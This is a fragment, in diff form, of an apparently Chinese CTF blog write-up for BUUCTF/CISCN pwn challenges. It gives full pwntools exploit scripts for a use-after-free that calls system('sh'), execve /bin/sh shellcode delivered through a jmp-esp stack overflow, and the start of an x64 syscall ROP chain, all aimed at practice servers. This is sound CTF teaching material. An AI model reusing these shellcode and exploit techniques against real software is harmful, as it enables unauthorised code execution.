+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29409</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>pwn_file<span class="token operator">=</span><span class="token string">'./problem/ciscn_2019_n_3'</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">new_int</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">def</span> <span class="token function">new_str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>Len<span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>Len<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Value > "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>new_str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>new_str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>pwn_file<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>system_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">#payload = flat(['sh\x00\x00', system_plt])</span></pre></td></tr><tr><td data-num="43"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'sh\x00\x00'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>new_str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="ciscn_s_9"><a class="markdownIt-Anchor" href="#ciscn_s_9">#</a> ciscn_s_9</h2>
+<h3 id="知识点-2"><a class="markdownIt-Anchor" href="#知识点-2">#</a> 知识点</h3>
 <ul>
 <li>栈溢出</li>
-<li><code>shellcode</code>书写</li>
+<li><code>shellcode</code>  书写</li>
 </ul>
 <p>没有开启任何保护</p>
-<p><code>pwn</code>函数</p>
-<pre class="highlight"><code class="c"><span class="hljs-type">int</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span>
-&#123;
-  <span class="hljs-type">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+8h] [ebp-20h] BYREF</span>
-
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nHey! ^_^&quot;</span>);
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nIt&#x27;s nice to meet you&quot;</span>);
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nDo you have anything to tell?&quot;</span>);
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&gt;&quot;</span>);
-  fflush(<span class="hljs-built_in">stdout</span>);
-  fgets(s, <span class="hljs-number">50</span>, <span class="hljs-built_in">stdin</span>);
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK bye~&quot;</span>);
-  fflush(<span class="hljs-built_in">stdout</span>);
-  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
-&#125;
-</code></pre>
-<p>可以发现<code>s</code>发生了栈溢出，然后注意到还有一个函数</p>
+<p><code>pwn</code>  函数</p>
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-20h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nHey! ^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nIt's nice to meet you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nDo you have anything to tell?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>可以发现 <code>s</code>  发生了栈溢出，然后注意到还有一个函数</p>
 <p><code>hint</code></p>
-<pre class="highlight"><code class="c"><span class="hljs-type">void</span> <span class="hljs-title function_">hint</span><span class="hljs-params">()</span>
-&#123;
-  __asm &#123; jmp     esp &#125;
-&#125;
-</code></pre>
-<p>没有开启NX保护，所以考虑在栈上执行，即将<code>pc</code>指向栈上的地址</p>
-<p>一般可以用<code>shellcraft.sh()</code>来生成<code>shellcode</code>，但是长度不够，我们要栈溢出，先考虑要溢出的字符长度</p>
-<p><code>0x28=40=32+4+4</code>：<code>s</code>的长度(<code>32</code>字节)+原来的<code>ebp</code>(<code>4</code>字节)+<code>ret</code>的位置(<code>4</code>字节)</p>
-<p>所以先将<code>shellcode</code>在<code>fgets</code>的时候输入到栈上，然后覆盖返回地址为<code>jmp  esp</code>。</p>
-<p><code>shellcode</code>的编写如下</p>
-<pre class="highlight"><code class="python">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;
-xor eax,eax             #eax置0
-xor edx,edx			   #edx置0
-push edx			   #将0入栈，标记了”/bin/sh”的结尾
-push 0x68732f2f         #传递&quot;/sh&quot;，为了4字节对齐，使用//sh，这在execve()中等同于/sh  68-h 73-s 2f-/ 2f-/
-push 0x6e69622f         #传递&quot;/bin&quot;  6e-n 69-i 62-b 2f-/ ,这里是exec的参数进栈，32位通过栈来传参
-mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx
-xor ecx,ecx
-mov al,0xB              #eax置为execve函数的中断号
-int 0x80                #调用软中断
-&#x27;&#x27;&#x27;</span>
-</code></pre>
-<p>发送如下<code>payload</code></p>
-<pre class="highlight"><code class="python">payload=shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p32(jump_esp)+asm(<span class="hljs-string">&quot;sub esp,40;call esp&quot;</span>)
-</code></pre>
-<p>此时的栈布局如下</p>
-<pre class="highlight"><code class="">|            |                  low address 
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  __asm <span class="token punctuation">&#123;</span> jmp     esp <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>没有开启 NX 保护，所以考虑在栈上执行，即将 <code>pc</code>  指向栈上的地址</p>
+<p>一般可以用 <code>shellcraft.sh()</code>  来生成 <code>shellcode</code> ，但是长度不够，我们要栈溢出，先考虑要溢出的字符长度</p>
+<p><code>0x28=40=32+4+4</code> ： <code>s</code>  的长度 ( <code>32</code>  字节)+ 原来的 <code>ebp</code> ( <code>4</code>  字节)+ <code>ret</code>  的位置 ( <code>4</code>  字节)</p>
+<p>所以先将 <code>shellcode</code>  在 <code>fgets</code>  的时候输入到栈上，然后覆盖返回地址为 <code>jmp  esp</code> 。</p>
+<p><code>shellcode</code>  的编写如下</p>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre>shellcode <span class="token operator">=</span><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="2"></td><td><pre>xor eax,eax             #eax置0</pre></td></tr><tr><td data-num="3"></td><td><pre>xor edx,edx			   #edx置0</pre></td></tr><tr><td data-num="4"></td><td><pre>push edx			   #将0入栈，标记了”/bin/sh”的结尾</pre></td></tr><tr><td data-num="5"></td><td><pre>push 0x68732f2f         #传递"/sh"，为了4字节对齐，使用//sh，这在execve()中等同于/sh  68-h 73-s 2f-/ 2f-/</pre></td></tr><tr><td data-num="6"></td><td><pre>push 0x6e69622f         #传递"/bin"  6e-n 69-i 62-b 2f-/ ,这里是exec的参数进栈，32位通过栈来传参</pre></td></tr><tr><td data-num="7"></td><td><pre>mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx</pre></td></tr><tr><td data-num="8"></td><td><pre>xor ecx,ecx</pre></td></tr><tr><td data-num="9"></td><td><pre>mov al,0xB              #eax置为execve函数的中断号</pre></td></tr><tr><td data-num="10"></td><td><pre>int 0x80                #调用软中断</pre></td></tr><tr><td data-num="11"></td><td><pre>'''</span></pre></td></tr></table></figure><p>发送如下 <code>payload</code></p>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token operator">=</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>jump_esp<span class="token punctuation">)</span><span class="token operator">+</span>asm<span class="token punctuation">(</span><span class="token string">"sub esp,40;call esp"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>此时的栈布局如下</p>
+<pre><code>|            |                  low address 
 | shellcode  | 0x20            
 |            |
 --------------
@@ -354,39 +207,14 @@ int 0x80                #调用软中断
 | sub esp,40 |&lt;-esp
 |  call esp  |
 </code></pre>
-<p>溢出返回地址后，跳转到<code>esp</code>所在的地址，即要执行<code>sub esp,40</code>，为什么要执行这个，因为<code>esp</code>是往低地址增的，所以为了拉高<code>esp</code>回到原来的<code>shellcode</code>在栈上的位置，即<code>esp-40</code>，更改完<code>esp</code>后，直接<code>call esp</code>来到<code>shellcode</code>的开始位置执行</p>
-<p>注意使用<code>asm</code>的时候，需要执行运行及其的架构</p>
-<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27774</span>)
-context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)
-jump_esp=<span class="hljs-number">0x8048554</span>
-shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;
-xor eax,eax             #eax置0
-xor edx,edx				#edx置0
-push edx				#将0入栈，标记了”/bin/sh”的结尾
-push 0x68732f2f         #传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh  68-h 73-s 2f-/ 2f-/
-push 0x6e69622f         #传递“/bin”  6e-n 69-i 62-b 2f-/
-mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx
-xor ecx,ecx
-mov al,0xB              #eax置为execve函数的中断号
-int 0x80                #调用软中断
-&#x27;&#x27;&#x27;</span>
-shellcode=asm(shellcode)
-<span class="hljs-comment">#23</span>
-<span class="hljs-comment">#shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span>
-payload=shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p32(jump_esp)
-<span class="hljs-comment">#40</span>
-payload+=asm(<span class="hljs-string">&quot;sub esp,40;call esp&quot;</span>)
-p.sendline(payload)
-p.interactive()
-
-</code></pre>
-<h2 id="ciscn_final_3"><a class="markdownIt-Anchor" href="#ciscn_final_3"></a> ciscn_final_3</h2>
+<p>溢出返回地址后，跳转到 <code>esp</code>  所在的地址，即要执行 <code>sub esp,40</code> ，为什么要执行这个，因为 <code>esp</code>  是往低地址增的，所以为了拉高 <code>esp</code>  回到原来的 <code>shellcode</code>  在栈上的位置，即 <code>esp-40</code> ，更改完 <code>esp</code>  后，直接 <code>call esp</code>  来到 <code>shellcode</code>  的开始位置执行</p>
+<p>注意使用 <code>asm</code>  的时候，需要执行运行及其的架构</p>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27774</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>jump_esp<span class="token operator">=</span><span class="token number">0x8048554</span></pre></td></tr><tr><td data-num="5"></td><td><pre>shellcode <span class="token operator">=</span><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="6"></td><td><pre>xor eax,eax             #eax置0</pre></td></tr><tr><td data-num="7"></td><td><pre>xor edx,edx				#edx置0</pre></td></tr><tr><td data-num="8"></td><td><pre>push edx				#将0入栈，标记了”/bin/sh”的结尾</pre></td></tr><tr><td data-num="9"></td><td><pre>push 0x68732f2f         #传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh  68-h 73-s 2f-/ 2f-/</pre></td></tr><tr><td data-num="10"></td><td><pre>push 0x6e69622f         #传递“/bin”  6e-n 69-i 62-b 2f-/</pre></td></tr><tr><td data-num="11"></td><td><pre>mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx</pre></td></tr><tr><td data-num="12"></td><td><pre>xor ecx,ecx</pre></td></tr><tr><td data-num="13"></td><td><pre>mov al,0xB              #eax置为execve函数的中断号</pre></td></tr><tr><td data-num="14"></td><td><pre>int 0x80                #调用软中断</pre></td></tr><tr><td data-num="15"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="16"></td><td><pre>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#23</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">#shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></pre></td></tr><tr><td data-num="19"></td><td><pre>payload<span class="token operator">=</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>jump_esp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#40</span></pre></td></tr><tr><td data-num="21"></td><td><pre>payload<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token string">"sub esp,40;call esp"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="ciscn_final_3"><a class="markdownIt-Anchor" href="#ciscn_final_3">#</a> ciscn_final_3</h2>
 <p>知识点</p>
 <ul>
-<li><code>tcache_dup</code>：注意在<code>2.27-3ubuntu1</code>之后的<code>libc</code>版本不可使用</li>
+<li><code>tcache_dup</code> ：注意在 <code>2.27-3ubuntu1</code>  之后的 <code>libc</code>  版本不可使用</li>
 </ul>
-<h2 id="ciscn_s_8"><a class="markdownIt-Anchor" href="#ciscn_s_8"></a> ciscn_s_8</h2>
+<h2 id="ciscn_s_8"><a class="markdownIt-Anchor" href="#ciscn_s_8">#</a> ciscn_s_8</h2>
 <p>知识点</p>
 <ul>
 <li>ROP(execve syscall)</li>
@@ -395,17 +223,15 @@ p.interactive()
 </ul>
 <p>题目</p>
 <p>首先运行以下程序，根据字符串找对应的函数</p>
-<p><img data-src="/images/ciscn_buu_pwn/3-1670562794736.jpg" alt="" /></p>
-<p><img data-src="/images/ciscn_buu_pwn/4-1670563246093.jpg" alt="" /></p>
+<p><img data-src="/images/ciscn_buu_pwn/3-1670562794736.jpg" alt=""></p>
+<p><img data-src="/images/ciscn_buu_pwn/4-1670563246093.jpg" alt=""></p>
 <p>利用思路</p>
-<p>栈溢出、没有Canary，再字符串中没有找到<code>/bin/sh</code>。在Disassembly界面<code>Alt T</code>寻找<code>syscall</code>字符串，发现有，所以考虑使用<code>execve</code>，在<code>x64</code>下，<code>execve</code>的系统调用号是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>59</mn></mrow><annotation encoding="application/x-tex">59</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">9</span></span></span></span></p>
-<pre class="highlight"><code class="c"><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;
-</code></pre>
-<p><code>execve</code>有三个参数，第一个是存放了<code>/bin//sh</code>的指针，后面两个设置位<code>NULL</code>即可。那这个<code>/bin//sh</code>要存放在哪里呢？当然，可以放在栈上，但地址不容易确定。所以考虑放在<code>.bss</code>段上，在IDA用<code>Ctrl + s</code>即可查看各个段的位置。</p>
-<p>所以我们的思路是利用ROP，先在<code>.bss</code>段开头处存放<code>/bin//sh</code>，然后设置<code>systcall</code>的参数，最后调用<code>syscall</code>即可</p>
-<p>在Linux系统下<code>man syscall</code>可以方便看到不同架构下<code>syscall</code>调用的寄存器情况</p>
+<p>栈溢出、没有 Canary，再字符串中没有找到 <code>/bin/sh</code> 。在 Disassembly 界面 <code>Alt T</code>  寻找 <code>syscall</code>  字符串，发现有，所以考虑使用 <code>execve</code> ，在 <code>x64</code>  下， <code>execve</code>  的系统调用号是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>59</mn></mrow><annotation encoding="application/x-tex">59</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">9</span></span></span></span></p>
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><code>execve</code>  有三个参数，第一个是存放了 <code>/bin//sh</code>  的指针，后面两个设置位 <code>NULL</code>  即可。那这个 <code>/bin//sh</code>  要存放在哪里呢？当然，可以放在栈上，但地址不容易确定。所以考虑放在 <code>.bss</code>  段上，在 IDA 用 <code>Ctrl + s</code>  即可查看各个段的位置。</p>
+<p>所以我们的思路是利用 ROP，先在 <code>.bss</code>  段开头处存放 <code>/bin//sh</code> ，然后设置 <code>systcall</code>  的参数，最后调用 <code>syscall</code>  即可</p>
+<p>在 Linux 系统下 <code>man syscall</code>  可以方便看到不同架构下 <code>syscall</code>  调用的寄存器情况</p>
 <p>用汇编写就是</p>
-<pre class="highlight"><code class="asm">mov rsi [bss]
+<pre><code class="language-asm">mov rsi [bss]
 mov rax &quot;/bin//sh&quot;
 mov [rsi] rax
 mov rdi [bss]	 ;设置第一个参数
@@ -415,34 +241,7 @@ mov rax 0x3B	  ;设置系统调用号
 call syscall
 </code></pre>
 <p>exp</p>
-<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-
-p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29457</span>)
-context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span>
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">s</span>):
-    res=<span class="hljs-string">&#x27;&#x27;</span>
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):
-        res += <span class="hljs-built_in">chr</span>(s[i]^<span class="hljs-number">0x66</span>)
-    <span class="hljs-keyword">return</span> res
-pop_rdi = <span class="hljs-number">0x4006e6</span>
-pop_rdx_rsi = <span class="hljs-number">0x44c179</span>
-pop_rsi = <span class="hljs-number">0x4040fe</span>
-bss = <span class="hljs-number">0x6BC2E0</span>
-read = <span class="hljs-number">0x449BE0</span>
-puts = <span class="hljs-number">0x410550</span>
-<span class="hljs-built_in">open</span> = <span class="hljs-number">0x4102B0</span>
-syscall = <span class="hljs-number">0x40139c</span>
-pop_rax = <span class="hljs-number">0x449b9c</span>
-mov_rax_inrsi = <span class="hljs-number">0x47f7b1</span>
